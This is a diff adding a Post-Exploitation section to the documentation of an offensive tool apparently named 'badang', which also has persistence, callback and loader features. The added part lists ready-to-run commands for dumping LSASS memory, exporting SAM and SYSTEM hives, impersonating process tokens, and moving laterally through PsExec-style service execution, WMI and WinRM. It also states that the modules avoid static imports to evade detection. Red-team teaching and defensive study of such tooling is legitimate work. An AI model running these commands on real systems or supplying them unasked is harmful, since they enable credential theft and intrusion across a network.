@@ -446,6 +446,40 @@ Each check reports CLEAN or FLAGGED with specific details. If any check is flagg
 
 ---
 
+## 14. Post-Exploitation
+
+After establishing persistence and communications, harvest credentials and move laterally.
+
+### Credential Harvesting
+
+```bash
+# Memory snapshot (requires elevated privileges + target PID)
+badang-cli postex --module lsass --pid 672 --postex-output dump.bin -x -c
+
+# Registry export (SAM + SYSTEM hives)
+badang-cli postex --module sam --postex-output C:\Temp -x -c
+
+# Session delegation (assume another process's identity)
+badang-cli postex --module token --pid 672 -x -c
+```
+
+### Lateral Movement
+
+```bash
+# Remote service execution (PsExec pattern)
+badang-cli postex --module psexec --remote 10.0.0.5 --postex-user admin --postex-pass pass --postex-payload svc.exe -x -c
+
+# WMI execution
+badang-cli postex --module wmi --remote 10.0.0.5 --postex-cmd "cmd /c whoami" -x -c
+
+# WinRM execution
+badang-cli postex --module winrm --remote 10.0.0.5 --postex-cmd "hostname" -x -c
+```
+
+Six modules: `lsass`, `sam`, `token` (credentials) and `psexec`, `wmi`, `winrm` (lateral). All use dynamic API resolution — no static imports.
+
+---
+
 ## GUI Workflow
 
 The GUI (`badang.exe`) provides the same capabilities with a visual interface:
@@ -461,6 +495,7 @@ The GUI (`badang.exe`) provides the same capabilities with a visual interface:
 9. **Persist** tab — select persistence method, configure, execute
 10. **Comms** tab — configure callback channel, transport parameters, execute
 11. **Loader** tab — select check category, run environment analysis, view results
+12. **PostEx** tab — select post-exploitation module, configure, execute
 
 The top bar shows the current mode (Dry Run / Live) and the Confirm checkbox. The log panel at the bottom shows all output with color-coded severity.
 
